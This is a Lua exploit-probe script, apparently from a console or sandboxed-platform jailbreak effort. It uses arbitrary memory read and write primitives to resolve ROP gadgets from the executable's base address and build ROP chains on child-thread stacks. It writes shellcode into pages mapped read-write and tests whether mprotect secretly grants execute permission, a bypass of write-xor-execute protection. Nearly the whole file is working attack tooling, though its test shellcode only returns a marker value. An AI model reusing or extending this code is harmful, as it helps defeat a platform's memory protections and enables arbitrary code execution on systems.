-- CRASH_CLASS: HIGH
-- PROBE 107a: test mprotect ghost-apply for EXEC permission
--
-- F_SETFL returns -1 but APPLIES the change (ghost result pattern).
-- Does mprotect(RWX) do the same? If it returns -1 but actually
-- changes page permissions to executable, we have W^X bypass.
--
-- Tests:
--   A: Control — eboot gadget chain (must work)
--   B: mmap(RW) + mprotect(RWX) + execute
--   C: mmap(RW) + mprotect(RX) + execute (read+exec, no write)
--   D: mmap(RW) + child mprotect(RWX) + execute (child thread path)

print("=== PROBE 107a: MPROTECT GHOST EXEC TEST ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function wb(a,v) pcall(function() memory.write_byte(a,uint64(v)) end) end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430); local sc_mp=mk(74)

local ok_c,ctrl=pcall(function()
    return mm(uint64(0),uint64(8*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_c then print("CTRL MMAP FAIL") return end
local R=N(ctrl)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl300=R+0x40; wq(sl300,uint64(0)); wq(sl300+8,uint64(300000000))
local tb=R+0x80
local RESULT=R+0x1000
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4
print(string.format("ctrl=0x%X", R))

local function write_shellcode(page)
    -- mov eax, 0xBEEFCAFE; ret (6 bytes)
    wb(page, 0xB8); wb(page+1, 0xFE); wb(page+2, 0xCA)
    wb(page+3, 0xEF); wb(page+4, 0xBE); wb(page+5, 0xC3)
end

local function setup_exec_child(target_ip)
    z(child_ctx,0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_AX,uint64(0))
    wq(child_ctx+_IP,target_ip)

    local off=0
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(RESULT)); off=off+8
    wq(child_stk+off,WMOV); off=off+8
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(ts999)); off=off+8
    wq(child_stk+off,PRSI); off=off+8
    wq(child_stk+off,uint64(0)); off=off+8
    wq(child_stk+off,PRAX); off=off+8
    wq(child_stk+off,uint64(240)); off=off+8
    wq(child_stk+off,SA); off=off+8
end

local function setup_mprotect_child(page_addr, prot)
    z(child_ctx,0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_AX,uint64(74))  -- mprotect
    wq(child_ctx+_DI,uint64(page_addr))
    wq(child_ctx+_SI,uint64(0x4000))
    wq(child_ctx+_DX,uint64(prot))
    wq(child_ctx+_IP,SA)

    local off=0
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(RESULT)); off=off+8
    wq(child_stk+off,WMOV); off=off+8
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(ts999)); off=off+8
    wq(child_stk+off,PRSI); off=off+8
    wq(child_stk+off,uint64(0)); off=off+8
    wq(child_stk+off,PRAX); off=off+8
    wq(child_stk+off,uint64(240)); off=off+8
    wq(child_stk+off,SA); off=off+8
end

local function try_exec(label, target_ip)
    wq(RESULT,uint64(0xDEADCAFE))
    setup_exec_child(target_ip)
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
    native.fcall_with_rax(stub,240,N(sl300),0)

    local rv=rd(RESULT)
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then
        print(string.format("  %s: PROCESS KILLED (page not executable)", label))
        return false, nil
    elseif rv==0xBEEFCAFE then
        print(string.format("  %s: *** EXECUTED! rv=0xBEEFCAFE ***", label))
        return true, rv
    elseif rv==0xDEADCAFE then
        print(string.format("  %s: SENTINEL (child died, page not executable)", label))
        return true, nil  -- process alive but child died
    else
        print(string.format("  %s: rv=0x%X (unexpected)", label, rv or 0))
        return true, rv
    end
end

-- ============================================================
print("")
print("--- A: CONTROL — eboot gadget (pop rax;ret + 0x42424242) ---")
wq(RESULT,uint64(0xDEADCAFE))

z(child_ctx,0x200)
wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
wq(child_ctx+_TP,uint64(0x10000))
wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
wq(child_ctx+_SP,uint64(child_stk))
wq(child_ctx+_IP,PRAX)

local off=0
wq(child_stk+off,uint64(0x42424242)); off=off+8
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(RESULT)); off=off+8
wq(child_stk+off,WMOV); off=off+8
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(ts999)); off=off+8
wq(child_stk+off,PRSI); off=off+8
wq(child_stk+off,uint64(0)); off=off+8
wq(child_stk+off,PRAX); off=off+8
wq(child_stk+off,uint64(240)); off=off+8
wq(child_stk+off,SA); off=off+8

wq(tb,uint64(0))
pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
native.fcall_with_rax(stub,240,N(sl300),0)

local ctrl_rv=rd(RESULT)
local c1=N(native.fcall_with_rax(stub,20))
print(string.format("  control=0x%X canary=%s", ctrl_rv or 0,
    c1==pid and "OK" or "FAIL"))
if ctrl_rv~=0x42424242 then
    print("  CONTROL FAILED — aborting")
    return
end

-- ============================================================
print("")
print("--- B: mmap(RW) + mprotect(RWX) from MAIN + execute ---")
local ok_b,page_b=pcall(function()
    return mm(uint64(0),uint64(0x4000),uint64(3),  -- PROT_RW
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_b then print("  mmap FAIL") return end
local PB=N(page_b)
print(string.format("  page=0x%X (mapped RW)", PB))
write_shellcode(PB)

-- Call mprotect(page, 0x4000, PROT_RWX=7) from main
local ok_mp,rv_mp=pcall(function()
    return sc_mp(uint64(PB),uint64(0x4000),uint64(7))
end)
local mp_rv=ok_mp and N(rv_mp) or -999
print(string.format("  mprotect(RWX) from main = %d", mp_rv))

-- Now try to execute the page
local alive_b, exec_b = try_exec("B_exec", page_b)
if not alive_b then
    print("  B: Process died — mprotect did NOT ghost-apply EXEC")
    return
end

-- ============================================================
print("")
print("--- C: mmap(RW) + mprotect(RX=5) from MAIN + execute ---")
local ok_c2,page_c=pcall(function()
    return mm(uint64(0),uint64(0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_c2 then print("  mmap FAIL") return end
local PC=N(page_c)
print(string.format("  page=0x%X (mapped RW)", PC))
write_shellcode(PC)

local ok_mpc,rv_mpc=pcall(function()
    return sc_mp(uint64(PC),uint64(0x4000),uint64(5))  -- PROT_READ|PROT_EXEC
end)
print(string.format("  mprotect(RX) from main = %d", ok_mpc and N(rv_mpc) or -999))

local alive_c, exec_c = try_exec("C_exec", page_c)
if not alive_c then
    print("  C: Process died — mprotect(RX) did NOT ghost-apply")
    return
end

-- ============================================================
print("")
print("--- D: mmap(RW) + mprotect(RWX) from CHILD + execute ---")
local ok_d,page_d=pcall(function()
    return mm(uint64(0),uint64(0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_d then print("  mmap FAIL") return end
local PD=N(page_d)
print(string.format("  page=0x%X (mapped RW)", PD))
write_shellcode(PD)

-- Child thread calls mprotect(page, 0x4000, 7)
wq(RESULT,uint64(0xDEADCAFE))
setup_mprotect_child(PD, 7)
wq(tb,uint64(0))
pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
native.fcall_with_rax(stub,240,N(sl300),0)

local mp_child=rd(RESULT)
local cd=N(native.fcall_with_rax(stub,20))
if cd~=pid then
    print("  child mprotect killed process!")
    return
end
print(string.format("  child mprotect(RWX) = 0x%X (%s)",
    mp_child or 0,
    mp_child==0xDEADCAFE and "sentinel/child died" or
    (mp_child==0xFFFFFFFF and "-1" or tostring(mp_child))))

-- Now try to execute the page
local alive_d, exec_d = try_exec("D_exec", page_d)
if not alive_d then
    print("  D: Process died — child mprotect did NOT ghost-apply EXEC")
    return
end

-- ============================================================
print("")
print("--- E: SUMMARY ---")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("canary=%s", fc==pid and "OK" or "FAIL"))

if exec_b==0xBEEFCAFE or exec_c==0xBEEFCAFE or exec_d==0xBEEFCAFE then
    print("*** W^X BYPASS FOUND! SHELLCODE EXECUTION ACHIEVED! ***")
else
    print("ALL mprotect ghost tests NEGATIVE — W^X is absolute")
    print("No ghost-apply for EXEC permissions on any path")
end

print("=== 107a COMPLETE ===")
